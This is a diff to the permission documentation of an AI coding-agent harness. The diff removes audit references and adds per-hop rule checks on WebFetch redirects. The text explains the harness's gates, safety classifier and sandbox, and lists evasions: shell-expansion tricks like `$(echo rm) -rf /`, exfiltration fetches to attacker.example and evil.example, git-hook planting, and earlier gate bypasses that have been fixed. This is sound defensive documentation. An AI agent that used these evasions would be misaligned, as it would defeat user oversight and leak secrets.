@@ -89,21 +89,19 @@ background there means the local console paths.)
 One hook promise survives the blanket grant: a hook rostered via
 `HeadlessPermissionPrompt::requireUnattendedAnswer()` keeps its exit-3 ASK out
 of bypass — with no terminal it fails closed to a refusal (the refusals row
-carries the E375 unattended qualifier), at a terminal the real question is put
-(ISS-040). PHP-registered hooks can opt in today; a settings-file key for the
+carries the unattended qualifier), at a terminal the real question is put. PHP-registered hooks can opt in today; a settings-file key for the
 same roster is a pending seam.
 
 Headless runs are also capped: `-p`/`-e` honour `CANDY_CODE_MAX_COST` (settings
 key `maxCostUsd`) — an invalid value exits 2 with `error.type` `usage` before
 any request; a mid-run breach emits one refusals row `{tool: turn, kind:
 budget}` (message `host.spend.mid_turn`) and the turn settles without further
-provider calls; JSON output still exits 0 (ISS-006).
+provider calls; JSON output still exits 0.
 
 ### A sub-agent's mode
 
 A `Task` sub-agent runs under the **stricter** of the session's mode and its
-preset's `permissionMode:` — never the wider, with one amendment (owner ruling
-2026-10-06): a `bypass-permissions` **session** passes `bypass-permissions`
+preset's `permissionMode:` — never the wider, with one amendment: a `bypass-permissions` **session** passes `bypass-permissions`
 down to every sub-agent regardless of what the preset asks, because bypass is
 allow-all by construction and a human who launched the session in it chose
 that for the whole tree of work; the preset's tool grants still scope which
@@ -151,7 +149,7 @@ tokeniser cannot parse (an unterminated quote) is still judged on its raw
 tokens. What it cannot see is anything that needs the shell to *expand*
 first — `$(echo rm) -rf /`, `x=-rf; rm $x /`, `bash -c '…'`, `eval`, aliases,
 `find / -delete` — so it remains a guard rail, not a containment boundary.
-(Before audit F-P1 the quoted-flag spellings, a second target, `/*`, `~/` and
+(The quoted-flag spellings, a second target, `/*`, `~/` and
 `$HOME` were all **allowed** under `bypass-permissions`.)
 
 It fires for `Bash` **and** `PtyRun` alike: `PtyRun` hands its `command` to the same
@@ -190,7 +188,7 @@ directories the harness owns (`~/.candy-code/memory` and the repository's
 would protect nothing `/memory` cannot undo. Rules still come first, so
 `{"pattern": "Memory", "action": "deny"}` turns it off.
 
-**`WebFetch` is not a read** (audit F-P6). It writes nothing locally, but
+**`WebFetch` is not a read**. It writes nothing locally, but
 "read-only" here means "safe to run unasked", and a fetch is an outbound request
 whose URL the model composes: `WebFetch https://attacker.example/?d=<base64 of
 what Read just returned>` used to run **unprompted** under `default`, `plan`
@@ -299,7 +297,7 @@ process substitution (`$(…)`, backticks, `<(…)`) or a `${…}` expansion oth
 than a plain `${name}` (`${x:=y}`, `${a[i]}`, `${x@P}` evaluate code); a
 background `&`; a line that does not parse (an open quote, a here-doc);
 `env` or `printenv` (the live environment is a credential dump the scrub only
-half protects — ISS-010); an operand anchored outside the project — an
+half protects); an operand anchored outside the project — an
 absolute path not under the root, anything under `$HOME`, a `..` escape (the
 auto-allow grants in-project visibility; machine-wide reads are a question); a
 file `protect-files` guards (`grep x .env`, `cat deploy.pem`, the credential
@@ -326,7 +324,7 @@ settings may switch it **off** but never back on over yours.
 
 ### `accept-edits`
 
-The mode grants **edits** (audit F-P4), and the grant was the other way round
+The mode grants **edits**, and the grant was the other way round
 until then: `Edit` and `Write` asked — a hard refusal wherever no prompt is
 attached — while `rm ./src/Main.php` ran unprompted. Now:
 
@@ -381,7 +379,7 @@ cannot judge with certainty to `Ask`, not to `Allow`. Concretely:
   used to auto-run — being non-absolute was the only test), and so does the root
   itself: `rmdir .` is not "something inside the directory".
 - A path with a **`.git`, `.candy-code` or `.mcp.json` segment** prompts even
-  though it is contained (audit F-J4): `touch ./.git/hooks/pre-commit` plants a
+  though it is contained: `touch ./.git/hooks/pre-commit` plants a
   hook that runs on your next `git commit`, `.candy-code/` holds hooks, presets
   and settings, and `.mcp.json` names commands the next launch spawns. The
   segment is matched the way bash matches a glob to a dotfile, so
@@ -415,7 +413,7 @@ same time; there is a test that fails if the wrapper changes.
 `plan` allows exploratory `Bash` **only when it can prove the command line is
 read-only**, and denies everything else — including a line it cannot parse.
 This is an allow-list, on purpose (`PermissionGate::isPlanReadOnlyBash()`,
-audit F-P2). Until then `plan` ran every `Bash` call that three regexes did not
+The fix is recent). Until then `plan` ran every `Bash` call that three regexes did not
 flag as a redirect: `echo x > f` was denied, but `echo x>f`, `echo x 2> f`,
 `cat a >| f`, `sed -i …`, `rm src/main.php`, `git commit -am wip`,
 `git push --force`, `curl -o f …` and `python3 -c "open('f','w')"` all **ran**.
@@ -497,7 +495,7 @@ judge, and each real call is judged when it arrives. A real call with no
 ### What `auto` classifies
 
 `SafetyClassifier` reads three tools, and the gate a fourth, each by the argument that carries its
-risk (audit F-P3(b) — before it, only `Bash` was read, so
+risk — before this check, only `Bash` was read, so
 `Write .git/hooks/pre-commit`, `WebFetch https://evil.example/?k=SECRET` and
 `mcp__db__drop_table` all ran under `auto`):
 
@@ -555,7 +553,7 @@ allow. The prompt or refusal you see names the category and the reviewer's
 one-line reason. The review call has the provider's connect timeout and no
 total timeout; it runs once per reviewed call — every flagged non-security
 call and, when `autoReview` is on, every non-read-only shell command the
-pattern list passed, where it can only narrow what would run (ISS-013).
+pattern list passed, where it can only narrow what would run.
 
 ### `auto`'s circuit breaker
 
@@ -618,7 +616,7 @@ mode, `Bash{command: "rm -rf build"}`:
 | *(no rules)* with `command: "rm -rf /"` | Deny (step 0, the breaker) |
 
 One dialect is translated on load: a Claude Code `(prefix:*)` tail
-(`Bash(rm:*)`, ISS-012) is rewritten to the native `Bash(rm *)` by
+(`Bash(rm:*)`) is rewritten to the native `Bash(rm *)` by
 `PermissionRule::fromClaudePrefixDialect()` as `Bootstrap::permissionRules()`
 reads it — the raw spelling passes well-formedness and matches nothing, so a
 migrated settings file silently denied nothing until this. Only that exact
@@ -655,7 +653,7 @@ How the argument half is matched:
   `true; 'rm' -rf build`. A permissive one (`allow`) fires only when **every**
   segment matches, so `Allow Bash(git *)` does **not** grant `git log && rm x`
   (measured: Deny under `dont-ask`).
-- **A shell `allow` fails closed** (audit F-P5). A greedy `*` used to swallow
+- **A shell `allow` fails closed**. A greedy `*` used to swallow
   whatever sat inside one segment: measured under `dont-ask` with
   `Allow Bash(git *)`, `git log $(id)`, ``git log `id` `` and
   `git log > /home/u/.bashrc` were all **Allow**. Now an `allow` rule does not
@@ -671,8 +669,7 @@ How the argument half is matched:
   `git log > /tmp/out` — and is then matched against the command as written,
   never the quote-removed words, so a quoted `'>'` cannot stand in for a real
   redirection.
-- **`WebFetch(domain:…)`** matches the **host** of the url, not the url text
-  (audit F-P6) — Claude Code's spelling, so an imported preset's
+- **`WebFetch(domain:…)`** matches the **host** of the url, not the url text — Claude Code's spelling, so an imported preset's
   `WebFetch(domain:github.com)` works as written. The host is read by the same
   parser the tool dials with, so `https://github.com@evil.example/` is
   `evil.example`. The value is a case-insensitive glob over the host:
@@ -681,7 +678,11 @@ How the argument half is matched:
   `ask` also covers subdomains (`Deny WebFetch(domain:evil.example)` stops
   `x.evil.example`), and fires on a url nobody can parse, where an `allow` does
   not. Granting a domain also grants wherever it **redirects** — `WebFetch`
-  follows up to three redirects, re-checking addresses but not rules. A
+  follows up to three redirects, and every hop is judged by the user's rules
+  before it is dialed: a matching `Deny` stops the fetch, and an `Ask` that
+  fires mid-redirect is a refusal with re-issue wording, not a question — a
+  hop cannot stop and wait for approval. A hop no rule names proceeds as
+  before. A
   `WebFetch(...)` pattern without `domain:` is still a literal glob over the
   whole url, and a poor grant: `Allow WebFetch(https://github.com*)` also
   matches `https://github.com.evil.example/`.
@@ -703,7 +704,7 @@ How the argument half is matched:
   An `allow` for `Edit` or `Write` does **not** carry over (a patch can also
   delete and move); grant `ApplyPatch(...)` itself. A patch whose paths do not
   parse is an unknowable subject: a restrictive path rule fires on it.
-- **A path rule judges the file the tool will open** (audit F-J3). The tools
+- **A path rule judges the file the tool will open**. The tools
   resolve a relative path against `--root`, and both the gate on the live hook
   chain and a sub-agent's — its session gate and its preset's own
   `tools` / `disallowedTools` grant (`Agents\AgentManager`) — are handed that
@@ -773,7 +774,7 @@ spellings for `Read`/`Edit`/`Write`/`Glob`/`Grep`/`Lsp`/`Ls`, per-path union for
 `Skill`; for the rest — and for `doctor` and `mcp__*`, which map no subject —
 the argument is unknowable, so the rule's action decides alone: a restrictive
 rule matches every call of that tool and an allow matches none. One translation
-exists for the deferred MCP spelling (MCP-7): a RESTRICTIVE rule naming a wire
+exists for the deferred MCP spelling: a RESTRICTIVE rule naming a wire
 tool, or any glob that matches it, also binds calls of the dispatcher named
 mcp_call whose server/tool arguments name that tool, and a restrictive rule
 naming that dispatcher binds bridged mcp__ calls too — the two spellings are
@@ -1056,7 +1057,7 @@ the TUI's permission prompt) stamps the kind on the result itself
 (`ToolResult::denial()`), and only that field counts. A tool that *ran* and
 failed with output opening the same way — `printf 'Permission denied: …'; exit 1`,
 or an MCP server's error text — is an ordinary failed call on every surface,
-because it was one (audit F-P8).
+because it was one.
 
 ---
 
@@ -1086,7 +1087,7 @@ allow, like any other `Ask`:
 | `*.pem`, `*.key` (with a stem, any case), SSH identities `id_rsa*`, `id_dsa*`, `id_ecdsa*`, `id_ed25519*` (not the `.pub` half) | all of the above — key material is the credential itself; public `.pem` certificates are refused too, since the extension cannot tell a chain from a key; `Grep` also never opens these files in a directory search, so `pattern: "PRIVATE KEY", path: "."` cannot print one |
 | `.git/config`, `config/*.php` | all of the above |
 | `.candy-code/hooks.yaml`, `.candy-code/config.json`, `.candy-code/agents/` | **writes only** (`Edit`, `Write`, `Bash`, `mcp__*`) — **floor: refuses in every mode, bypass included** |
-| `.git/hooks/`, `.git/info/` | **writes only** (`Edit`, `Write`, `Bash`, `mcp__*`) — a hook runs on your next `git commit`, outside any session (audit F-J4) — **floor: refuses in every mode, bypass included** |
+| `.git/hooks/`, `.git/info/` | **writes only** (`Edit`, `Write`, `Bash`, `mcp__*`) — a hook runs on your next `git commit`, outside any session — **floor: refuses in every mode, bypass included** |
 | `.candy-code/settings.json`, `.candy-code/settings.local.json`, `.mcp.json`, `.candy-code/skills`, `.candy-code/skills-proposed` (the dream pass's skill drafts), `.candy-code/commands`, `.candy-code/rules`, `.candy-code/workflows`, `.claude/settings.json`, `.claude/settings.local.json`, and `.claude/` / `.opencode/` `skills`, `agents`, `commands` (opencode's `agent`, `command` too) | **writes only, asked rather than refused** (`Edit`, `Write`, `Bash`, `mcp__*`) — the rest of the policy surface: settings tiers, the MCP server list, and prompt text, presets, commands and workflows the next session runs as yours. Every mode asks, `bypass-permissions` included (headless bypass answers its own ask allow); a mode that refuses the call on its own (`plan`, `dont-ask`) still refuses it |
 
 `Bash` commands are matched both as written and with quotes removed, so
@@ -1227,7 +1228,7 @@ text does once it is allowed, because `Bash` is deliberately not path-jailed
 (a free-form command cannot be jailed by rewriting its string). On Linux the
 user-tier `bashSandbox` setting adds that bound underneath the gate by running
 every command inside [bubblewrap](https://github.com/containers/bubblewrap)
-— and since ISS-002 the same setting jails `PtyRun` too: the jail flags ride
+— and the same setting jails `PtyRun` too: the jail flags ride
 the pseudo-terminal's spawn argv (the interactive argv form keeps the pty as
 the child's controlling terminal), so the terminal program is born inside the
 same write jail:
